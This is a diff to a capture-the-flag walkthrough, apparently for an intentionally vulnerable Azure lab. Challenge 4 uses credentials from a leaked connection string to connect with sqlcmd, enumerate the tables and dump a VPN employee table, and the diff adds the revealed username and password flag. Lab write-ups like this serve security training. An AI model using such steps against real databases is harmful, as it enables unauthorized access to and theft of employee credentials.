@@ -250,9 +250,14 @@ return new OkObjectResult("Server=tcp:securavulnerableserver.database.windows.ne
 
 Challenge 4:
 You can connect to the database using the connection string.
-There are a lot of ways to connect to a database, in our case, the preferred way is to use the command-line tool named sqlcmd.
 The command you can use to connect is sqlcmd -S securavulnerableserver.database.windows.net -d securavulnerabledb -U DevOps -P SECURA{C0NN3CT10N_STR1NG}.
-Once connected, you are able to execute SQl commands on the database. You can request all tables using SELECT * FROM information_schema.tables;go; Once you have found the table, you can list all data using SELECT * FROM vpn_employee_data. The flag is SECURA{VPN_CR3D3NT14LS}.
+
+SELECT * FROM information_schema.tables;
+go
+SELECT * FROM vpn_employee_data. 
+
+ vpn_username Employee23187 
+ vpn_password SECURA{VPN_CR3D3NT14LS}.
 
 https://www.brokenazure.cloud/drm0s7q6nhhvxk8e57yqvhd814/index.html
 
